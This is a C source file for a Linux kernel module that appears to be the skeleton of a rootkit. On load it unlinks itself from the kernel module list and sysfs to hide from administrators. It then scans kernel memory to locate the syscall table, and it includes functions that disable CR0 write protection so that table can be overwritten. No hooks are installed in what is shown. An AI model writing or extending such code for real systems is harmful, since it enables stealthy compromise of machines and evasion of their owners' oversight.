#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/init.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

#define START_MEM   PAGE_OFFSET
#define END_MEM     ULLONG_MAX

struct list_head *prev_module;

unsigned long long *syscall_table;

unsigned long long **find(void) {

  unsigned long long **sctable;
  unsigned long int i = START_MEM;

  while ( i < END_MEM) {

    sctable = (unsigned long long **)i;

    if ( sctable[__NR_close] == (unsigned long long *) sys_close) {

      return &sctable[0];
    }

    i += sizeof(void *);
  }

  return NULL;
}

void hide_module(void) {
  prev_module = THIS_MODULE->list.prev;

  mutex_lock(&module_mutex);

  list_del_rcu(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);

  synchronize_rcu();

  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;
  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;

  mutex_unlock(&module_mutex);
}

void show_module(void) {
  mutex_lock(&module_mutex);
  list_add_rcu(&THIS_MODULE->list, prev_module);
  synchronize_rcu();
  mutex_unlock(&module_mutex);
}

static int init(void) {
  hide_module();

  printk("\nModule starting...\n");

  syscall_table = (unsigned long long *) find();

  if ( syscall_table != NULL ) {

    printk("Syscall table found at %llx\n", (unsigned long long ) syscall_table);


  } else {

    printk("Syscall table not found!\n");

  }

  return 0;
}

static void exit_(void) {
  printk("Module ending\n");

  return;
}

void disable_write_protection(void) {

  write_cr0 (read_cr0 () & (~ 0x10000));

  return;
}

void enable_write_protection(void) {

  write_cr0 (read_cr0 () | 0x10000);

  return;
}

module_init(init);
module_exit(exit_);
